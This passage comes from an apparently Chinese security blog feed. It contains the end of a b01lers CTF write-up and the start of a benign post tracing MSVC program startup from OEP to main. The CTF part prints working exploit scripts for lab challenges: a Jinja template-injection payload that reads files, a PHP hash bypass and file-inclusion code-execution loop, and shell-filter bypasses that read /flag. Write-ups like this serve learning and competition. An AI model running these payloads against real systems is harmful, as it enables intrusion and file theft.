class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> html<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:5000&quot;</span><br><br>cookies = &#123;<br>    <span class="hljs-string">&quot;session&quot;</span>:<span class="hljs-string">&quot;.eJwlzjEOwzAIAMC_eO6ACRjIZyrbgJqhHZJmqvr3Rup8y33KPfc4HmV972fcyn3zspZmlFkNzJPceDorehvBCM3TdC7KUwwkhtoEmIIzQYCt1WFZK5G2sBG-UIirkgfy4oaRktn7EI-E5HoZdGCdWEfVQQSGbuWKnEfs_0335_Yq3x-PKDFL.Zh94Eg.X_qh-W0_CmiWDNl3WI1xTzkn3c4&quot;</span>,<br>    <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;__&quot;</span>,<br>    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;flag.txt&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>&#125;<br><br>INVALID = [<span class="hljs-string">&quot;&#123;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&#125;&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>]<br><br>payload = <span class="hljs-string">&quot;&#123;% set l=(request|attr(&#x27;cookies&#x27;)|attr(&#x27;get&#x27;)(&#x27;a&#x27;)) %&#125;&#123;% set f=(request|attr(&#x27;cookies&#x27;)|attr(&#x27;get&#x27;)(&#x27;file&#x27;)) %&#125;&#123;% print(lipsum|attr(l~&#x27;globals&#x27;~l)|attr(&#x27;get&#x27;)(l~&#x27;builtins&#x27;~l)|attr(&#x27;get&#x27;)(&#x27;open&#x27;)(f)|attr(&#x27;read&#x27;)()) %&#125;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> INVALID:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> payload:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DIE&quot;</span>)<br><br><span class="hljs-built_in">id</span> = hashlib.sha256((<span class="hljs-string">&quot;admin&quot;</span> + payload).encode()).hexdigest()<br><br>data[<span class="hljs-string">&quot;content&quot;</span>] = payload<br>r = requests.post(<br>    url = url + <span class="hljs-string">&quot;/createpost&quot;</span>,<br>    data = data,<br>    cookies=cookies,<br>    proxies=&#123;<br>        <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>    &#125;<br>)<br><br>r = requests.get(<br>    url = url + <span class="hljs-string">&quot;/view/&quot;</span> + <span class="hljs-built_in">id</span>,<br>    cookies=cookies,<br>)<br><br><span class="hljs-built_in">print</span>(html.unescape(r.text))<br></code></pre></td></tr></table></figure><h2 id="library_of_php逻辑漏洞">library_of_php（逻辑漏洞）</h2><p>进入页面，打开就是一个php搜索界面</p><p>搜索admin，但是不知道搜索范围，返回源码继续去看。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0048/1713506552468-190f9897-9f70-4393-ae99-a7e2ecd692a3.png" alt="img" /></p><p>程序逻辑如下</p><ol type="1"><li>用户输入搜索字符串，则程序生成一段含有该字符串的内容，并将该内容写入tmp文件夹，并返回内容对应的id。id的生成取决于搜索的字符串，生成文件名不可控。</li><li>通过内容id可以在<code>search.php</code>访问到具体内容。如果能通过hash校验，则可以将读取内容转换为php文件包含。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">真实文件路径 &lt;-&gt; SESSION &lt;-&gt; pageid<br>pageid &lt;- 种子 &lt;- 搜索字符串<br><br>存储到文件中的内容：<br><span class="hljs-number">1</span>、username对应的uid<br><span class="hljs-number">2</span>、文件内容<br><span class="hljs-comment"># 文件包含点</span><br><span class="hljs-comment"># 读取文件目录</span><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]) || !is_numeric(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$d</span> = rand(<span class="hljs-number">0</span>, getrandmax());<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br>&#125;<br><br><span class="hljs-variable">$c</span> = rand(<span class="hljs-number">0</span>, getrandmax());<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> ((hash(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$d</span> + <span class="hljs-variable">$c</span>)) === <span class="hljs-variable">$securify</span>) &#123;<br>  <span class="hljs-keyword">include</span> getBookPath(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);  <span class="hljs-comment"># 文件包含点</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span> getBook(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hash绕过">hash绕过</h3><p>这里的hash绕过本质上是通过在我们的上传d的基础上增加一个随机数，然后进行hash校验，我们可以通过上传一个很大的数构造<code>INF</code>，从而避免了随机数的影响。</p><p>这里给一组结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">d=<span class="hljs-number">1111111111111111111111111111111111</span>&amp;securify=<span class="hljs-number">0</span>b13f83578807d203451d161f22aada8e0d98bfe07b3a5171624a164d4eec3e9<br></code></pre></td></tr></table></figure><h3 id="文件包含">文件包含</h3><p>要想实现文件包含，我们需要构造<code>&lt;?php</code>字符串在输出文件中，我们回头来看文件包含的函数。通过开启输出缓冲区，然后将缓冲区内的所有内容输出到文件中。</p><p>这里我们能利用的就是搜索字符串（受到waf限制），还有就是触发报错了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 返回真实文件路径</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateResults</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>    ob_start();<br>    <span class="hljs-variable">$results</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment"># 根据字母表随机生成内容</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$results</span> .= <span class="hljs-keyword">$this</span>-&gt;alpha[mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-keyword">$this</span>-&gt;alpha) - <span class="hljs-number">1</span>)];<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Discoverer: &quot;</span>;<br>    <span class="hljs-comment"># 触发报错点，如果不存在$name这个键值，就会输出$name</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;owners[<span class="hljs-variable">$name</span>]) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;owners[<span class="hljs-variable">$name</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-comment"># 在结果中随机插入我们的content</span><br>    <span class="hljs-comment"># ... </span><br>    <br>    <span class="hljs-comment"># 结果输出到tmp文件夹下</span><br>    <span class="hljs-comment"># 输出文件名不可控</span><br>    <span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;./tmp/&#x27;</span> . uniqid() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-variable">$files</span> = glob(<span class="hljs-string">&#x27;./tmp/*&#x27;</span>); <span class="hljs-comment">// get all file names</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123; <br>        <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>)) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>    file_put_contents(<span class="hljs-variable">$path</span>,  ob_get_contents());<br>    ob_end_clean(); <span class="hljs-comment">// xss mitigations.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$path</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>触发报错的点在<code>$name</code>这里，我们需要对比两次name取值的差异</p><p>关键的差异就是第一次是值比较，第二次是isset。我们如果构造空字符串，那么就可以在第二次查找键中的内容时触发报错。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$page</span> = <span class="hljs-keyword">new</span> Page(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q&#x27;</span>], <span class="hljs-variable">$username</span> ? substr(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>], -<span class="hljs-number">6</span>) : <span class="hljs-string">&#x27;guest&#x27;</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) ? substr(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>], -<span class="hljs-number">6</span>) : <span class="hljs-string">&#x27;guest&#x27;</span>;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$page</span>-&gt;generateResults(<span class="hljs-variable">$username</span>);<br></code></pre></td></tr></table></figure><p>构造如下的payload，第一次的username为guest，第二次为<code>&lt;?php%0a</code>，这样就在查找键值时报错。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0048/1713516617885-2602c89f-5387-4403-a714-b7c1964e11cb.png" alt="img" /></p><p>注释绕过脏数据，可以爆破内容的开头为<code>/*</code>，并且中间没有对应的<code>*/</code>，这样就能成功注入代码</p><p>（之所以在前面不注入<code>&lt;?php%a0/*</code>是因为长度被限制了）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">q=*/<span class="hljs-keyword">echo</span> `cat /flag.txt`;<span class="hljs-comment">//</span><br>import requests<br>import html<br><br>url = <span class="hljs-string">&quot;http://192.168.80.128:8102&quot;</span><br><br>params = &#123;<br><br>&#125;<br><br>cookies = &#123;<br>    <span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;&lt;?php%0a&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&#x27;q&#x27;</span>:<span class="hljs-string">&quot;*/echo `cat /flag.txt`; //&quot;</span><br>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = requests.post(<br>    url = url + <span class="hljs-string">&quot;/index.php&quot;</span>,<br>    cookies=cookies,<br>    data = data<br>    )<br><br>    new_cookies = &#123;<br>        <span class="hljs-string">&quot;PHPSESSID&quot;</span>:r.headers[<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>].split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;;&#x27;</span>)[<span class="hljs-number">0</span>]<br>    &#125;<br><br>    <span class="hljs-comment"># print(new_cookies)</span><br><br>    r = requests.get(<br>        url = url + <span class="hljs-string">&quot;/search.php?s=0v-0000h-02112&amp;d=1111111111111111111111111111111111&amp;securify=0b13f83578807d203451d161f22aada8e0d98bfe07b3a5171624a164d4eec3e9&quot;</span>,<br>        cookies = new_cookies<br>    )<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> in r.text:<br>        <span class="hljs-keyword">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br>    <br></code></pre></td></tr></table></figure><h1 id="misc">Misc</h1><h2 id="wash">wash</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wabash</span>(<span class="hljs-params">command:<span class="hljs-built_in">str</span></span>):</span><br>    command = command.split()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(command)):<br>        command[i] = <span class="hljs-string">&quot;wa&quot;</span>+command[i]<br>        command[i] = command[i].replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        command[i] = command[i].replace(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>.join(command)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">slowprint</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s + <span class="hljs-string">&#x27;\n&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(c, end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">r&#x27;&#x27;&#x27;                  _                       _      </span><br><span class="hljs-string"> __ __ __ __ _   | |__    __ _     ___   | |_    </span><br><span class="hljs-string"> \ V  V // _` |  | &#x27;_ \  / _` |   (_-&lt;   | &#x27; \   </span><br><span class="hljs-string">  \_/\_/ \__,_|  |_.__/  \__,_|   /__/_  |_||_|  </span><br><span class="hljs-string">_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| </span><br><span class="hljs-string">&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27; </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>slowprint(<span class="hljs-string">&quot;$ `bash`;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sh: 1: wabash: not found&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    os.system(wabash(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;$ &quot;</span>)))<br></code></pre></td></tr></table></figure><p>使用管道符<code>||</code>可以直接绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">||cat&lt;/flag<br></code></pre></td></tr></table></figure><h2 id="bash-with-pipe">bash with pipe</h2><p>限制了RCE，只能使用管道来进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br><br><span class="hljs-keyword">import</span> subprocess<br><br>prefix = <span class="hljs-string">&#x27;cat with |&#x27;</span><br>ban_list = [<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;||&#x27;</span>, <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_input</span>():</span><br>    inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;$ <span class="hljs-subst">&#123;prefix&#125;</span> &#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> banned <span class="hljs-keyword">in</span> ban_list:<br>        <span class="hljs-keyword">if</span> banned <span class="hljs-keyword">in</span> inp:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;disallowed: <span class="hljs-subst">&#123;banned&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>    subprocess.call(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span> <span class="hljs-subst">&#123;inp&#125;</span>&#x27;</span>, shell=<span class="hljs-literal">True</span>, executable=<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    run_input()<br></code></pre></td></tr></table></figure><p>这里我们可以使用xargs将输出作为命令参数，使用awk进行对于多余参数的去除</p><ol type="1"><li>ls获取当前文件夹下内容，一共有三个文件</li><li>awk去除第三行的输出</li><li>xargs 将前两行输出的文件名作为 diff 的命令行参数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cat <span class="hljs-keyword">with</span> | ls | awk NR!=<span class="hljs-number">3</span> | xargs diff<br></code></pre></td></tr></table></figure><h2 id="section"></h2>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>Games</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>b01lersCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向分析-OEP到main启动</title>
    <link href="/2024/03/31/blog0047-OEP%E5%88%B0main%E5%90%AF%E5%8A%A8/"/>
    <url>/2024/03/31/blog0047-OEP%E5%88%B0main%E5%90%AF%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<p>逆向随笔</p><span id="more"></span><h2 id="项目配置">项目配置</h2><p>我们选用Ollydbg和VS2019来实现对一个进程从OEP到main函数的过程分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello world!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为了方便查看外部代码，我们关闭<code>调试 -&gt; 选项 -&gt; 启用仅我的代码</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0047/1711865738303-fa1a7401-aec4-4c57-a0fc-ff5b047095c2.png" alt="img" /></p><p>（可选）<code>属性 -&gt; 链接器 -&gt; 高级</code>里关闭随机基址</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0047/1711864165088-e728436b-1b13-4805-9732-a36ffa9bae65.png" alt="img" /></p><h2 id="调试过程">调试过程</h2><p>F5启动程序，可以发现当前main函数的调用堆栈情况</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0047/1711865787331-6219fe9b-f8e6-4d49-86e6-bdbc2e3de513.png" alt="img" /></p><p>我们从<code>mainCRTStartup</code>开始分析</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0047/1711865948651-1d4dbec4-305a-45a3-9a90-d44cfffb4a69.png" alt="img" /></p><p>使用OD也可以看出，程序OEP的第一条指令就是<code>jmp mainCRTStartup</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0047/1711867004127-9ecf5ac8-370b-4052-a28a-d6056b26e799.png" alt="img" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0047/1711867089828-a28a530b-2ce3-4f5e-bb1f-8a56ee399f57.png" alt="img" /></p><p>跟进<code>__scrt_common_main()</code>，该函数主要完成gs安全机制的<code>security_cookie</code>的初始化</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0047/1711865907187-33ab19f3-6558-4564-b06b-a543fc158b15.png" alt="img" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0047/1711867351255-8e636718-4ee3-492a-baa0-12e14f287065.png" alt="img" /></p><p>继续跟进<code>__scrt_common_main_seh()</code>，这里我直接复制了C源码，可以看到Windows在重要部分都添加了注释说明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __declspec(noinline) <span class="hljs-keyword">int</span> __cdecl __scrt_common_main_seh()<br>&#123;<br>    <span class="hljs-comment">// 初始化CRT</span><br>    <span class="hljs-keyword">if</span> (!__scrt_initialize_crt(__scrt_module_type::exe))<br>        __scrt_fastfail(FAST_FAIL_FATAL_APP_EXIT);<br>    <br>    <span class="hljs-keyword">bool</span> has_cctor = <span class="hljs-literal">false</span>;<br>    __try<br>    &#123;<br>        <span class="hljs-keyword">bool</span> <span class="hljs-keyword">const</span> is_nested = __scrt_acquire_startup_lock();<br><br>        <span class="hljs-keyword">if</span> (__scrt_current_native_startup_state == __scrt_native_startup_state::initializing)<br>        &#123;<br>            __scrt_fastfail(FAST_FAIL_FATAL_APP_EXIT);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (__scrt_current_native_startup_state == __scrt_native_startup_state::uninitialized)<br>        &#123;<br>            __scrt_current_native_startup_state = __scrt_native_startup_state::initializing;<br><br>            <span class="hljs-comment">// 初始化全局变量、静态变量</span><br>            <span class="hljs-keyword">if</span> (_initterm_e(__xi_a, __xi_z) != <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">255</span>;<br><br>            _initterm(__xc_a, __xc_z);<br><br>            __scrt_current_native_startup_state = __scrt_native_startup_state::initialized;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            has_cctor = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        __scrt_release_startup_lock(is_nested);<br><br>        <span class="hljs-comment">// If this module has any dynamically initialized __declspec(thread)</span><br>        